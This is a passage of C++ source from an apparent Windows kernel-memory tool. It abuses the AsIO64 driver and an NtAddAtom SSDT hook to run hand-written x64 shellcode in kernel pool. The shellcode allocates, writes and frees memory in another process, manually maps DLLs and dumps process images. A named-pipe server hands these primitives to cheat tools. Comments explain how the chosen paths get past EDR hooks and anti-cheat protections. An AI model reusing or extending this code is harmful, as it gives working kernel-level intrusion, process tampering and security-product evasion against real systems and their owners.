    const uint64_t fnKeStackAttach    = kernel.GetKernelModuleExport(ntoskrnl, "KeStackAttachProcess");
    const uint64_t fnZwAlloc          = kernel.GetKernelModuleExport(ntoskrnl, "ZwAllocateVirtualMemory");
    const uint64_t fnKeUnstackDetach  = kernel.GetKernelModuleExport(ntoskrnl, "KeUnstackDetachProcess");
    if (!fnKeStackAttach || !fnZwAlloc || !fnKeUnstackDetach) {
        std::wcerr << L"[-] Failed to resolve KeStackAttachProcess / ZwAllocateVirtualMemory / KeUnstackDetachProcess" << std::endl;
        return 0;
    }

    const uint64_t shellPool = kernel.AllocatePool(sizeof(kAllocatorShellcode));
    if (!shellPool) {
        std::wcerr << L"[-] Allocator pool (shellcode) failed" << std::endl;
        return 0;
    }
    if (!kernel.WriteKernelMemory(shellPool, kAllocatorShellcode, sizeof(kAllocatorShellcode))) {
        std::wcerr << L"[-] Failed to drop allocator shellcode in kernel" << std::endl;
        return 0;
    }

    const uint64_t cmdPool = kernel.AllocatePool(sizeof(R0AllocCmd));
    if (!cmdPool) {
        std::wcerr << L"[-] Allocator pool (cmd) failed" << std::endl;
        return 0;
    }

    R0AllocCmd cmd{};
    cmd.Eprocess                  = eprocess;
    cmd.Size                      = size;
    cmd.Protect                   = protect;
    cmd.BaseAddress               = 0;  // caller-chosen
    cmd.Status                    = static_cast<int32_t>(0xC0000001L);  // STATUS_UNSUCCESSFUL sentinel
    cmd.FnKeStackAttach           = fnKeStackAttach;
    cmd.FnZwAllocateVirtualMemory = fnZwAlloc;
    cmd.FnKeUnstackDetachProcess  = fnKeUnstackDetach;
    if (!kernel.WriteKernelMemory(cmdPool, &cmd, sizeof(cmd))) {
        std::wcerr << L"[-] Failed to write allocator cmd" << std::endl;
        return 0;
    }

    std::wcout << L"[+] Calling R0 allocator shellcode @ 0x" << std::hex << shellPool
               << L"  cmd @ 0x" << cmdPool << std::dec << std::endl;

    NTSTATUS shellReturn = 0;
    if (!kernel.CallKernelFunction(&shellReturn, shellPool, cmdPool)) {
        std::wcerr << L"[-] CallKernelFunction(allocator) failed" << std::endl;
        return 0;
    }

    // Re-read the command struct to harvest the output fields.
    R0AllocCmd resp{};
    if (!kernel.ReadKernelMemory(cmdPool, &resp, sizeof(resp))) {
        std::wcerr << L"[-] Failed to read allocator response" << std::endl;
        return 0;
    }

    if (!NT_SUCCESS(resp.Status)) {
        std::wcerr << L"[-] ZwAllocateVirtualMemory returned 0x"
                   << std::hex << resp.Status << std::dec << std::endl;
        return 0;
    }

    std::wcout << L"[+] R0 allocation: 0x" << std::hex << resp.BaseAddress
               << L"  size 0x" << resp.Size << L"  protect 0x" << protect
               << std::dec << std::endl;
    return resp.BaseAddress;
}

// Release a user VA previously returned by AllocateTargetUserMem via the
// symmetric R0 ZwFreeVirtualMemory path. Same shellcode + cmd-struct
// pattern; only the inner kernel call changes. We deliberately reuse the
// "leak shellcode pool, reuse cmd pool" approach AllocateTargetUserMem
// established — cmdPool is left behind on purpose to avoid a free-race.
#pragma pack(push, 8)
struct R0FreeCmd {
    uint64_t Eprocess;            // +0x00 in
    uint64_t Size;                // +0x08 in (0 = release whole region)
    uint64_t Pad0;                // +0x10
    uint64_t BaseAddress;         // +0x18 in/out (passed by pointer to ZwFreeVm)
    int32_t  Status;              // +0x20 out
    uint32_t Pad1;                // +0x24
    uint64_t FnKeStackAttach;     // +0x28
    uint64_t FnZwFreeVirtualMemory; // +0x30
    uint64_t FnKeUnstackDetach;   // +0x38
    uint8_t  ApcState[0x30];      // +0x40
};
#pragma pack(pop)
static_assert(sizeof(R0FreeCmd) == 0x70, "R0FreeCmd must be 0x70 bytes");

// 70-byte x64 shellcode. Entry: rcx = &cmd. Returns NTSTATUS in eax.
static const uint8_t kFreeShellcode[] = {
    // prologue: push rbx ; sub rsp, 0x40 ; mov rbx, rcx
    0x53,
    0x48, 0x83, 0xEC, 0x40,
    0x48, 0x89, 0xCB,

    // KeStackAttachProcess(Eprocess, &ApcState)
    0x48, 0x8B, 0x0B,                                  // mov rcx, [rbx]
    0x48, 0x8D, 0x53, 0x40,                            // lea rdx, [rbx+0x40]
    0x48, 0x8B, 0x43, 0x28,                            // mov rax, [rbx+0x28]
    0xFF, 0xD0,                                        // call rax

    // ZwFreeVirtualMemory(NtCurrentProcess=-1, &BaseAddress, &Size, MEM_RELEASE)
    0x48, 0xC7, 0xC1, 0xFF, 0xFF, 0xFF, 0xFF,          // mov rcx, -1
    0x48, 0x8D, 0x53, 0x18,                            // lea rdx, [rbx+0x18]
    0x4C, 0x8D, 0x43, 0x08,                            // lea r8,  [rbx+0x08]
    0x41, 0xB9, 0x00, 0x80, 0x00, 0x00,                // mov r9d, 0x8000   ; MEM_RELEASE
    0x48, 0x8B, 0x43, 0x30,                            // mov rax, [rbx+0x30]
    0xFF, 0xD0,                                        // call rax
    0x89, 0x43, 0x20,                                  // mov [rbx+0x20], eax

    // KeUnstackDetachProcess(&ApcState)
    0x48, 0x8D, 0x4B, 0x40,                            // lea rcx, [rbx+0x40]
    0x48, 0x8B, 0x43, 0x38,                            // mov rax, [rbx+0x38]
    0xFF, 0xD0,                                        // call rax

    // return cmd->Status
    0x8B, 0x43, 0x20,                                  // mov eax, [rbx+0x20]
    0x48, 0x83, 0xC4, 0x40,
    0x5B,
    0xC3,
};
static_assert(sizeof(kFreeShellcode) == 70, "kFreeShellcode size drifted");

// Release a `va` previously returned by AllocateTargetUserMem in the
// target process. ZwFreeVirtualMemory with RegionSize=0 + MEM_RELEASE
// matches the VirtualFree(p, 0, MEM_RELEASE) contract — the kernel uses
// the VAD bookkeeping to figure out the real size.
static bool FreeTargetUserMem(AsioProvider& kernel, uint64_t eprocess, uint64_t va) {
    if (!eprocess || !va) return false;

    const uint64_t ntoskrnl = kernel.NtoskrnlBase();
    const uint64_t fnKeStackAttach   = kernel.GetKernelModuleExport(ntoskrnl, "KeStackAttachProcess");
    const uint64_t fnZwFreeVm        = kernel.GetKernelModuleExport(ntoskrnl, "ZwFreeVirtualMemory");
    const uint64_t fnKeUnstackDetach = kernel.GetKernelModuleExport(ntoskrnl, "KeUnstackDetachProcess");
    if (!fnKeStackAttach || !fnZwFreeVm || !fnKeUnstackDetach) {
        std::wcerr << L"[-] FreeTargetUserMem: failed to resolve exports" << std::endl;
        return false;
    }

    const uint64_t shellPool = kernel.AllocatePool(sizeof(kFreeShellcode));
    if (!shellPool) return false;
    if (!kernel.WriteKernelMemory(shellPool, kFreeShellcode, sizeof(kFreeShellcode))) {
        return false;
    }

    const uint64_t cmdPool = kernel.AllocatePool(sizeof(R0FreeCmd));
    if (!cmdPool) return false;

    R0FreeCmd cmd{};
    cmd.Eprocess              = eprocess;
    cmd.Size                  = 0;          // MEM_RELEASE: whole region
    cmd.BaseAddress           = va;
    cmd.Status                = static_cast<int32_t>(0xC0000001L);
    cmd.FnKeStackAttach       = fnKeStackAttach;
    cmd.FnZwFreeVirtualMemory = fnZwFreeVm;
    cmd.FnKeUnstackDetach     = fnKeUnstackDetach;
    if (!kernel.WriteKernelMemory(cmdPool, &cmd, sizeof(cmd))) return false;

    NTSTATUS shellReturn = 0;
    if (!kernel.CallKernelFunction(&shellReturn, shellPool, cmdPool)) {
        std::wcerr << L"[-] FreeTargetUserMem: CallKernelFunction failed" << std::endl;
        return false;
    }

    R0FreeCmd resp{};
    if (!kernel.ReadKernelMemory(cmdPool, &resp, sizeof(resp))) return false;
    if (!NT_SUCCESS(resp.Status)) {
        std::wcerr << L"[-] ZwFreeVirtualMemory returned 0x"
                   << std::hex << resp.Status << std::dec << std::endl;
        return false;
    }
    return true;
}

// =====================  R0 .pdata / SEH table registration  ====================
//
// After we manual-map a DLL into the target, the image's .pdata
// (IMAGE_DIRECTORY_ENTRY_EXCEPTION) is just bytes — no part of the OS knows
// the unwind tables exist. The first time the image runs a function that
// has try/catch or a C++ destructor that needs to unwind, the SEH
// dispatcher walks RtlpDynamicFunctionTable, finds nothing for our image
// base, and the process bugchecks.
//
// Blackbone solves this by remoting RtlAddFunctionTable into a worker
// thread it owns. We do it from R0 instead: KeStackAttachProcess into the
// target, call ntdll!RtlAddFunctionTable directly with PreviousMode =
// KernelMode (Zw calls would set this for us, but for an ntdll user-mode
// helper we just call its export address — it's the same code either way).
//
// Why ntdll!RtlAddFunctionTable (not the InvertedFunctionTable direct write
// Blackbone falls back to):
//   * RtlAddFunctionTable is a stable, exported, documented API. It's
//     called constantly by JITs / .NET / Wine / driver loaders, so EDRs
//     can't single-hook it without drowning in false positives.
//   * LdrpInvertedFunctionTable is internal, layout-shifts per Win build,
//     lives in read-only mrdata on Win10+ which adds protection juggling,
//     and uses EncodeSystemPointer cookies. Way more moving parts.
//
// Cmd struct (kernel pool, 0x70 bytes):
//   +0x00  Eprocess
//   +0x08  RuntimeFunctionsVa     (target-space VA of RUNTIME_FUNCTION[])
//   +0x10  Count                  (ULONG = Size / sizeof(RUNTIME_FUNCTION))
//   +0x14  Pad0
//   +0x18  ImageBase              (target-space ImageBase)
//   +0x20  Result                 (BOOLEAN, low byte of eax)
//   +0x24  Pad1
//   +0x28  FnKeStackAttach
//   +0x30  FnRtlAddFunctionTable
//   +0x38  FnKeUnstackDetach
//   +0x40  ApcState[0x30]
//   total: 0x70

// ─────────────────────────────────────────────────────────────────────────
// Attached-memcpy write helper (Option E).
//
// Why: writing image bytes to a freshly R0-allocated target user-VA buffer
// has historically been fragile.
//   * CR3 physical write (WriteTargetMem) walks PTEs and silently no-ops on
//     demand-zero PTEs (TargetVtoP returns false).
//   * MDL write (WriteTargetMemViaMdl) calls MmProbeAndLockPages which
//     RAISES STATUS_ACCESS_VIOLATION on demand-zero PTEs (documented
//     behavior). Our raw shellcode has no SEH → bugcheck.
//
// Solution: KeStackAttachProcess into the target, then memcpy in kernel
// context. Writes to user VAs from kernel mode trigger the standard OS
// page-fault handler (MiUserFault / KiPageFault) which materializes
// demand-zero, transition, proto, and pagefile pages transparently.
// The OS handler has its own SEH and only escalates to the caller when
// the VAD itself doesn't cover the address. Our buffer's VAD is
// committed (we just NtAllocateVirtualMemory'd it via R0AllocCmd), so
// demand-zero never raises.
//
// Cmd struct (kernel pool, 0x70 bytes):
//   +0x00  Eprocess
//   +0x08  DestVa             (target user-mode VA)
//   +0x10  SrcKernelPool      (kernel pool addr holding source bytes)
//   +0x18  Size
//   +0x20  Status             (ULONG out: 0=ok)
//   +0x24  Pad0
//   +0x28  FnKeStackAttach
//   +0x30  FnMemcpy
//   +0x38  FnKeUnstackDetach
//   +0x40  ApcState[0x30]
//   total: 0x70
#pragma pack(push, 8)
struct R0AttachMemcpyCmd {
    uint64_t Eprocess;
    uint64_t DestVa;
    uint64_t SrcKernelPool;
    uint64_t Size;
    uint32_t Status;
    uint32_t Pad0;
    uint64_t FnKeStackAttach;
    uint64_t FnMemcpy;
    uint64_t FnKeUnstackDetach;
    uint8_t  ApcState[0x30];
};
#pragma pack(pop)
static_assert(sizeof(R0AttachMemcpyCmd) == 0x70, "R0AttachMemcpyCmd must be 0x70 bytes");

// x64 shellcode. Entry: rcx = &cmd. Returns 0 on success in eax (raise
// path won't reach the return — OS handler takes over; we just optimistically
// zero on the success path).
static const uint8_t kAttachMemcpyShellcode[] = {
    // prologue
    0x53,                                              // push rbx
    0x48, 0x83, 0xEC, 0x40,                            // sub rsp, 0x40
    0x48, 0x89, 0xCB,                                  // mov rbx, rcx

    // KeStackAttachProcess(Eprocess, &ApcState)
    0x48, 0x8B, 0x0B,                                  // mov rcx, [rbx]
    0x48, 0x8D, 0x53, 0x40,                            // lea rdx, [rbx+0x40]
    0x48, 0x8B, 0x43, 0x28,                            // mov rax, [rbx+0x28]
    0xFF, 0xD0,                                        // call rax

    // memcpy(DestVa, SrcKernelPool, Size)
    0x48, 0x8B, 0x4B, 0x08,                            // mov rcx, [rbx+0x08]
    0x48, 0x8B, 0x53, 0x10,                            // mov rdx, [rbx+0x10]
    0x4C, 0x8B, 0x43, 0x18,                            // mov r8,  [rbx+0x18]
    0x48, 0x8B, 0x43, 0x30,                            // mov rax, [rbx+0x30]
    0xFF, 0xD0,                                        // call rax

    // KeUnstackDetachProcess(&ApcState)
    0x48, 0x8D, 0x4B, 0x40,                            // lea rcx, [rbx+0x40]
    0x48, 0x8B, 0x43, 0x38,                            // mov rax, [rbx+0x38]
    0xFF, 0xD0,                                        // call rax

    // status = 0
    0xC7, 0x43, 0x20, 0x00, 0x00, 0x00, 0x00,          // mov dword ptr [rbx+0x20], 0
    0x31, 0xC0,                                        // xor eax, eax

    // epilogue
    0x48, 0x83, 0xC4, 0x40,                            // add rsp, 0x40
    0x5B,                                              // pop rbx
    0xC3,                                              // ret
};
static_assert(sizeof(kAttachMemcpyShellcode) == 64, "kAttachMemcpyShellcode size drifted");

static bool WriteTargetMemViaAttachedMemcpy(AsioProvider& kernel, uint64_t eprocess,
                                            uint64_t destVa, const void* srcBytes,
                                            size_t size) {
    if (!eprocess || !destVa || !srcBytes || !size) return false;

    const uint64_t ntoskrnl   = kernel.NtoskrnlBase();
    const uint64_t fnKeAttach = kernel.GetKernelModuleExport(ntoskrnl, "KeStackAttachProcess");
    const uint64_t fnKeDetach = kernel.GetKernelModuleExport(ntoskrnl, "KeUnstackDetachProcess");
    const uint64_t fnMemcpy   = kernel.GetKernelModuleExport(ntoskrnl, "memcpy");
    if (!fnKeAttach || !fnKeDetach || !fnMemcpy) {
        std::wcerr << L"[-] AttachedMemcpy: failed to resolve KeStackAttach/Detach/memcpy" << std::endl;
        return false;
    }

    // 1) Copy source bytes into kernel pool.
    const uint64_t srcPool = kernel.AllocatePool(size);
    if (!srcPool) {
        std::wcerr << L"[-] AttachedMemcpy: AllocatePool(src) failed" << std::endl;
        return false;
    }
    if (!kernel.WriteKernelMemory(srcPool, srcBytes, size)) {
        std::wcerr << L"[-] AttachedMemcpy: WriteKernelMemory(src) failed" << std::endl;
        kernel.FreePool(srcPool);
        return false;
    }

    // 2) Stage shellcode (leak-by-design like other helpers).
    const uint64_t shellPool = kernel.AllocatePool(sizeof(kAttachMemcpyShellcode));
    if (!shellPool) {
        kernel.FreePool(srcPool);
        return false;
    }
    if (!kernel.WriteKernelMemory(shellPool, kAttachMemcpyShellcode, sizeof(kAttachMemcpyShellcode))) {
        kernel.FreePool(srcPool);
        return false;
    }

    // 3) Build & stage cmd.
    const uint64_t cmdPool = kernel.AllocatePool(sizeof(R0AttachMemcpyCmd));
    if (!cmdPool) {
        kernel.FreePool(srcPool);
        return false;
    }
    R0AttachMemcpyCmd cmd{};
    cmd.Eprocess          = eprocess;
    cmd.DestVa            = destVa;
    cmd.SrcKernelPool     = srcPool;
    cmd.Size              = static_cast<uint64_t>(size);
    cmd.Status            = 0xDEADBEEF;
    cmd.FnKeStackAttach   = fnKeAttach;
    cmd.FnMemcpy          = fnMemcpy;
    cmd.FnKeUnstackDetach = fnKeDetach;
    if (!kernel.WriteKernelMemory(cmdPool, &cmd, sizeof(cmd))) {
        kernel.FreePool(srcPool);
        kernel.FreePool(cmdPool);
        return false;
    }

    // 4) Invoke.
    uint64_t shellReturn = 0;
    const bool callOk = kernel.CallKernelFunction(&shellReturn, shellPool, cmdPool);

    // 5) Read back status.
    R0AttachMemcpyCmd resp{};
    bool readOk = kernel.ReadKernelMemory(cmdPool, &resp, sizeof(resp));

    // 6) Cleanup (shellPool intentionally leaked — kAllocatorShellcode pattern).
    kernel.FreePool(srcPool);
    kernel.FreePool(cmdPool);

    if (!callOk) {
        std::wcerr << L"[-] AttachedMemcpy: CallKernelFunction failed" << std::endl;
        return false;
    }
    if (!readOk) {
        std::wcerr << L"[-] AttachedMemcpy: failed to read back status" << std::endl;
        return false;
    }
    if (resp.Status != 0) {
        std::wcerr << L"[-] AttachedMemcpy: shellcode status=0x"
                   << std::hex << resp.Status << std::dec << std::endl;
        return false;
    }
    return true;
}
// ─────────────────────────────────────────────────────────────────────────

//
// Reads SizeOfImage bytes from the target's primary EXE load base (the one
// ntoskrnl tracks as the process's "section base address") through the
// Pure-R0 path: PsGetProcessSectionBaseAddress + ReadTargetMem. Pages that
// can't be translated (uncommitted .bss-style regions) are filled with
// zeros. Section headers in the output are rewritten so PointerToRawData
// equals VirtualAddress and SizeOfRawData covers the page-aligned virtual
// size — this is the standard "memory dump PE" layout that IDA / Ghidra /
// CFF Explorer load directly.

static uint64_t GetTargetMainImageBase(AsioProvider& kernel, uint64_t eprocess) {
    const uint64_t ntoskrnl = kernel.NtoskrnlBase();
    const uint64_t fn = kernel.GetKernelModuleExport(ntoskrnl, "PsGetProcessSectionBaseAddress");
    if (!fn) {
        std::wcerr << L"[-] PsGetProcessSectionBaseAddress not resolved" << std::endl;
        return 0;
    }
    uint64_t base = 0;
    if (!kernel.CallKernelFunction(&base, fn, eprocess)) {
        std::wcerr << L"[-] CallKernelFunction(PsGetProcessSectionBaseAddress) failed" << std::endl;
        return 0;
    }
    return base;
}

static bool DumpTargetMainImage(AsioProvider& kernel, uint64_t eprocess,
                                uint64_t cr3, const std::wstring& outputPath) {
    const uint64_t imageBase = GetTargetMainImageBase(kernel, eprocess);
    if (!imageBase) {
        std::wcerr << L"[-] Could not resolve target main image base" << std::endl;
        return false;
    }
    std::wcout << L"[+] Target main image base: 0x" << std::hex << imageBase << std::dec << std::endl;

    IMAGE_DOS_HEADER dos{};
    if (!ReadTargetMem(kernel, cr3, imageBase, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE) {
        std::wcerr << L"[-] Failed to read target DOS header (or no MZ at image base)" << std::endl;
        return false;
    }
    IMAGE_NT_HEADERS64 nt{};
    if (!ReadTargetMem(kernel, cr3, imageBase + dos.e_lfanew, &nt, sizeof(nt)) || nt.Signature != IMAGE_NT_SIGNATURE) {
        std::wcerr << L"[-] Failed to read target NT headers (or PE\\0\\0 missing)" << std::endl;
        return false;
    }
    if (nt.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        std::wcerr << L"[-] Target main image is not PE32+ (we only support x64 dumps)" << std::endl;
        return false;
    }

    const uint32_t sizeOfImage = nt.OptionalHeader.SizeOfImage;
    std::wcout << L"[+] Target SizeOfImage: 0x" << std::hex << sizeOfImage << std::dec
               << L" (" << (sizeOfImage / 1024) << L" KiB)" << std::endl;

    std::vector<uint8_t> buffer(sizeOfImage);

    // Page-by-page read so partial failures (uncommitted pages, anti-cheat
    // protected ranges, etc.) don't kill the whole dump — we just zero the
    // page and keep going. Print a progress line every ~16 MiB to give the
    // user a sense the tool isn't hung on a 100 MiB game image.
    constexpr uint32_t kPage = 0x1000;
    size_t pagesRead = 0, pagesSkipped = 0;
    const uint32_t progressEvery = 0x1000000 / kPage;  // every 16 MiB
    for (uint32_t off = 0, page = 0; off < sizeOfImage; off += kPage, ++page) {
        const uint32_t chunk = std::min<uint32_t>(kPage, sizeOfImage - off);
        if (ReadTargetMem(kernel, cr3, imageBase + off, buffer.data() + off, chunk)) {
            ++pagesRead;
        } else {
            std::memset(buffer.data() + off, 0, chunk);
            ++pagesSkipped;
        }
        if (progressEvery && (page % progressEvery) == 0 && page) {
            std::wcout << L"[*] Dump progress: 0x" << std::hex << off
                       << L"/" << sizeOfImage << std::dec << std::endl;
        }
    }
    std::wcout << L"[+] Dump read complete — " << pagesRead << L" pages OK, "
               << pagesSkipped << L" zeroed" << std::endl;

    // Rewrite section headers so the dump loads cleanly in IDA/Ghidra:
    //   PointerToRawData = VirtualAddress
    //   SizeOfRawData    = page-aligned VirtualSize
    // This produces a "memory-aligned PE" — the standard format for
    // process-image dumps. Tools either auto-detect or accept it as
    // "Manual load → Loaded image".
    PIMAGE_NT_HEADERS64 dumpNt = reinterpret_cast<PIMAGE_NT_HEADERS64>(buffer.data() + dos.e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(dumpNt);
    for (WORD i = 0; i < dumpNt->FileHeader.NumberOfSections; ++i) {
        const DWORD vsize = section[i].Misc.VirtualSize;
        const DWORD aligned = (vsize + 0xFFF) & ~0xFFFu;
        section[i].SizeOfRawData    = aligned;
        section[i].PointerToRawData = section[i].VirtualAddress;
    }

    HANDLE file = CreateFileW(outputPath.c_str(), GENERIC_WRITE, 0, nullptr,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file == INVALID_HANDLE_VALUE) {
        PrintWin32Error(L"CreateFileW(dump output)");
        return false;
    }
    DWORD written = 0;
    const BOOL ok = WriteFile(file, buffer.data(), static_cast<DWORD>(buffer.size()), &written, nullptr);
    CloseHandle(file);
    if (!ok || written != buffer.size()) {
        PrintWin32Error(L"WriteFile(dump output)");
        return false;
    }
    std::wcout << L"[+] Dumped 0x" << std::hex << buffer.size() << std::dec
               << L" bytes to " << outputPath << std::endl;
    return true;
}

// ============================================================================
//   IPC server  ( --server )
//
//   Long-lived loop that accepts a single client at a time over a named pipe
//   and serves R0-backed read / write primitives. The point is to expose this
//   process's already-established AsIO64 + NtAddAtom SSDT-hook to external
//   tools (CheatEngine fork, UEDumper, custom scanners) so they don't have to
//   load any driver themselves and don't have to issue any user-mode memory
//   syscall against the target.
//
//   Wire format: see asio_r0_proto.h.
// ============================================================================

struct PipeSession {
    HANDLE   pipe = INVALID_HANDLE_VALUE;
    HANDLE   targetProcess = INVALID_HANDLE_VALUE;
    DWORD    pid = 0;
    uint64_t eprocess = 0;
    uint64_t cr3 = 0;
    uint64_t imageBase = 0;
    uint64_t imageSize = 0;

    // CE-style typed value scan state (SCAN_VALUE / SCAN_NEXT).
    struct ScanResult { uint64_t va; uint64_t prev_value; };
    std::vector<ScanResult> scanResults;
    uint8_t scanValueType = 0;
};

static bool PipeReadAll(HANDLE pipe, void* buf, size_t size) {
    uint8_t* p = static_cast<uint8_t*>(buf);
    size_t done = 0;
    while (done < size) {
        DWORD got = 0;
        const DWORD want = static_cast<DWORD>(std::min<size_t>(size - done, 0x10000));
        if (!ReadFile(pipe, p + done, want, &got, nullptr) || got == 0) {
            return false;
        }
        done += got;
    }
    return true;
}

static bool PipeWriteAll(HANDLE pipe, const void* buf, size_t size) {
    const uint8_t* p = static_cast<const uint8_t*>(buf);
    size_t done = 0;
    while (done < size) {
        DWORD wrote = 0;
        const DWORD want = static_cast<DWORD>(std::min<size_t>(size - done, 0x10000));
        if (!WriteFile(pipe, p + done, want, &wrote, nullptr) || wrote == 0) {
            return false;
        }
        done += wrote;
    }
    return true;
}

// =====================  R0 page-fault-safe read fallback  ====================
//
// Replaces the previous user-mode ReadProcessMemory page-fault fallback
// with a pure MDL read executed inside the target's address space via the
// existing NtAddAtom SSDT hook.
//
// Why MDL instead of ZwReadVirtualMemory / MmCopyVirtualMemory:
//   * ZwReadVirtualMemory and the underlying MiReadWriteVirtualMemory /
//     MmCopyVirtualMemory are first-class EDR targets — every commercial
//     endpoint product hooks them as part of "cross-process read" telemetry.
//   * IoAllocateMdl / MmProbeAndLockPages / MmMapLockedPagesSpecifyCache /
//     memcpy / MmUnlockPages / IoFreeMdl are the ordinary I/O path used by
//     thousands of legitimate drivers per second. EDRs that hook them
//     drown in noise and almost never do.
//
// Trade-off accepted:
//   MmProbeAndLockPages raises on lock failure. Writing a SEH wrapper in
//   raw shellcode requires registered .pdata/.xdata which we don't have.
//   Mitigation: caller is responsible for handing in plausible VAs (the
//   reverse-engine reader does this naturally — it never reads freed or
//   never-committed memory). A raise here bugchecks.
//
// Single-page granularity is enforced by HandleRead's outer loop (added in
// the call site), so a doomed page only takes itself down, not the whole
// payload.
//
// Cmd struct layout (kept in kernel pool):
//   +0x00  PEPROCESS  Eprocess                             (in)
//   +0x08  PVOID      Va                                   (in)
//   +0x10  SIZE_T     Size                                 (in)
//   +0x18  PVOID      DestBuf                              (in, kernel pool dest)
//   +0x20  ULONG      ReadOk                               (out, 0/1)
//   +0x24  ULONG      Pad0
//   +0x28  PMDL       MdlScratch                           (internal)
//   +0x30  PVOID      FnKeStackAttachProcess
//   +0x38  PVOID      FnKeUnstackDetachProcess
//   +0x40  PVOID      FnIoAllocateMdl
//   +0x48  PVOID      FnMmProbeAndLockPages
//   +0x50  PVOID      FnMmMapLockedPagesSpecifyCache
//   +0x58  PVOID      FnMmUnlockPages
//   +0x60  PVOID      FnIoFreeMdl
//   +0x68  PVOID      FnMemcpy
//   +0x70  UCHAR[0x30] ApcState scratch (KAPC_STATE on x64)
//   total: 0xA0 bytes

#pragma pack(push, 8)
struct R0ReadMdlCmd {
    uint64_t Eprocess;
    uint64_t Va;
    uint64_t Size;
    uint64_t DestBuf;
    uint32_t ReadOk;
    uint32_t Pad0;
    uint64_t MdlScratch;
    uint64_t FnKeStackAttachProcess;
    uint64_t FnKeUnstackDetachProcess;
    uint64_t FnIoAllocateMdl;
    uint64_t FnMmProbeAndLockPages;
    uint64_t FnMmMapLockedPagesSpecifyCache;
    uint64_t FnMmUnlockPages;
    uint64_t FnIoFreeMdl;
    uint64_t FnMemcpy;
    uint8_t  ApcState[0x30];
};
#pragma pack(pop)
static_assert(sizeof(R0ReadMdlCmd) == 0xA0, "R0ReadMdlCmd must be 0xA0 bytes");

// x64 shellcode. Entry: rcx = &cmd. Returns cmd->ReadOk (0/1) in eax.
//
// All calls use exported ntoskrnl IO routines — none of them are part of
// the cross-process syscall hook surface that EDRs monitor.
//
// Stack frame: push rbx + sub rsp,0x40 == 72 bytes from entry; +8 ret addr
// makes 80 = 16n. Top 0x40 holds the Win64 home space + up to two 5th/6th
// outgoing args (MmMapLockedPagesSpecifyCache needs both).
static const uint8_t kReadMdlShellcode[] = {
    // prologue: push rbx ; sub rsp, 0x40 ; mov rbx, rcx
    0x53,
    0x48, 0x83, 0xEC, 0x40,
    0x48, 0x89, 0xCB,

    // KeStackAttachProcess(Eprocess, &ApcState)
    0x48, 0x8B, 0x0B,                                  // mov rcx, [rbx]            ; Eprocess
    0x48, 0x8D, 0x53, 0x70,                            // lea rdx, [rbx+0x70]       ; &ApcState
    0x48, 0x8B, 0x43, 0x30,                            // mov rax, [rbx+0x30]       ; FnKeStackAttachProcess
    0xFF, 0xD0,                                        // call rax

    // mdl = IoAllocateMdl(Va, (ULONG)Size, FALSE, FALSE, NULL)
    0x48, 0x8B, 0x4B, 0x08,                            // mov rcx, [rbx+0x08]       ; Va
    0x8B, 0x53, 0x10,                                  // mov edx, [rbx+0x10]       ; Size (low 32 — MDL size is ULONG)
    0x45, 0x31, 0xC0,                                  // xor r8d, r8d              ; SecondaryBuffer = FALSE
    0x45, 0x31, 0xC9,                                  // xor r9d, r9d              ; ChargeQuota = FALSE
    0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,  // mov qword [rsp+0x20], 0  ; Irp = NULL
    0x48, 0x8B, 0x43, 0x40,                            // mov rax, [rbx+0x40]       ; FnIoAllocateMdl
    0xFF, 0xD0,                                        // call rax
    0x48, 0x89, 0x43, 0x28,                            // mov [rbx+0x28], rax       ; cmd->MdlScratch
    0x48, 0x85, 0xC0,                                  // test rax, rax
    0x74, 0x65,                                        // jz .detach_only (+0x65)

    // MmProbeAndLockPages(mdl, UserMode=1, IoReadAccess=0)
    // ** can raise on failure; up-front pre-check is the caller's job **
    0x48, 0x89, 0xC1,                                  // mov rcx, rax              ; mdl
    0xBA, 0x01, 0x00, 0x00, 0x00,                      // mov edx, 1                ; UserMode
    0x45, 0x31, 0xC0,                                  // xor r8d, r8d              ; IoReadAccess
    0x48, 0x8B, 0x43, 0x48,                            // mov rax, [rbx+0x48]       ; FnMmProbeAndLockPages
    0xFF, 0xD0,                                        // call rax

    // sysAddr = MmMapLockedPagesSpecifyCache(mdl, KernelMode=0, MmCached=0,
    //                                        NULL, FALSE, NormalPagePriority|MdlMappingNoExecute)
    0x48, 0x8B, 0x4B, 0x28,                            // mov rcx, [rbx+0x28]       ; mdl
    0x31, 0xD2,                                        // xor edx, edx              ; AccessMode = KernelMode
    0x45, 0x31, 0xC0,                                  // xor r8d, r8d              ; CacheType = MmCached
    0x4D, 0x31, 0xC9,                                  // xor r9, r9                ; RequestedAddress = NULL
    0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,  // mov qword [rsp+0x20], 0  ; BugCheckOnFailure = FALSE
    0xC7, 0x44, 0x24, 0x28, 0x10, 0x00, 0x00, 0x40,    // mov dword [rsp+0x28], 0x40000010  ; Priority
    0x48, 0x8B, 0x43, 0x50,                            // mov rax, [rbx+0x50]       ; FnMmMapLockedPagesSpecifyCache
    0xFF, 0xD0,                                        // call rax
    0x48, 0x85, 0xC0,                                  // test rax, rax
    0x74, 0x18,                                        // jz .unlock_free (+0x18)

    // memcpy(DestBuf, sysAddr, Size)
    0x48, 0x8B, 0x4B, 0x18,                            // mov rcx, [rbx+0x18]       ; DestBuf
    0x48, 0x89, 0xC2,                                  // mov rdx, rax              ; sysAddr (from prev call)
    0x4C, 0x8B, 0x43, 0x10,                            // mov r8,  [rbx+0x10]       ; Size
    0x48, 0x8B, 0x43, 0x68,                            // mov rax, [rbx+0x68]       ; FnMemcpy
    0xFF, 0xD0,                                        // call rax
    0xC7, 0x43, 0x20, 0x01, 0x00, 0x00, 0x00,          // mov dword [rbx+0x20], 1   ; cmd->ReadOk = 1

    // .unlock_free: MmUnlockPages(mdl) ; IoFreeMdl(mdl)
    0x48, 0x8B, 0x4B, 0x28,                            // mov rcx, [rbx+0x28]
    0x48, 0x8B, 0x43, 0x58,                            // mov rax, [rbx+0x58]       ; FnMmUnlockPages
    0xFF, 0xD0,                                        // call rax
    0x48, 0x8B, 0x4B, 0x28,                            // mov rcx, [rbx+0x28]
    0x48, 0x8B, 0x43, 0x60,                            // mov rax, [rbx+0x60]       ; FnIoFreeMdl
    0xFF, 0xD0,                                        // call rax

